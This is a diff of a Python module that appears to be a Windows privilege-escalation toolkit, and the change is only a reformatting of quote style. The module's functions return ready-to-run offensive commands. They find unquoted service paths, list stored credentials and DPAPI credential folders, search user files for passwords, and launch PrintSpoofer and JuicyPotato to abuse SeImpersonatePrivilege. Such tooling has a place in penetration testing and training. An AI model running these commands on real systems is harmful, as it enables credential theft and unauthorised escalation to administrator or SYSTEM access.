@@ -68,10 +68,10 @@ def token_privileges_commands() -> list[str]:
 def unquoted_service_path_command() -> str:
     """Return a WMI query to find unquoted service path vulnerabilities."""
     return (
-        'wmic service get name,displayname,pathname,startmode '
+        "wmic service get name,displayname,pathname,startmode "
         '| findstr /i "auto" '
         '| findstr /i /v "c:\\windows" '
-        '| findstr /i /v \'"\''
+        "| findstr /i /v '\"'"
     )
 
 
@@ -103,7 +103,7 @@ def credential_files_commands() -> list[str]:
         "cmdkey /list",
         r"dir %userprofile%\AppData\Local\Microsoft\Credentials\ /a",
         r"dir %userprofile%\AppData\Roaming\Microsoft\Credentials\ /a",
-        r'dir /s /b %userprofile%\*.xml %userprofile%\*.ini %userprofile%\*.txt 2>nul | findstr /i pass',
+        r"dir /s /b %userprofile%\*.xml %userprofile%\*.ini %userprofile%\*.txt 2>nul | findstr /i pass",
         r"Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.xml,*.ini,*.txt "
         r"-ErrorAction SilentlyContinue | Select-String -Pattern 'password'",
     ]
@@ -135,7 +135,7 @@ def dpapi_commands(
 
 def printspoofer_command(payload: str = "cmd.exe") -> str:
     """Return a PrintSpoofer command to abuse SeImpersonatePrivilege."""
-    return f"PrintSpoofer.exe -i -c \"{payload}\""
+    return f'PrintSpoofer.exe -i -c "{payload}"'
 
 
 def juicy_potato_command(
@@ -150,9 +150,7 @@ def juicy_potato_command(
     CLSID list at https://github.com/ohpe/juicy-potato/tree/master/CLSID
     for other OS versions.
     """
-    return (
-        f"JuicyPotato.exe -l {port} -p \"{payload}\" -t * -c \"{clsid}\""
-    )
+    return f'JuicyPotato.exe -l {port} -p "{payload}" -t * -c "{clsid}"'
 
 
 def registry_autorun_commands() -> list[str]:
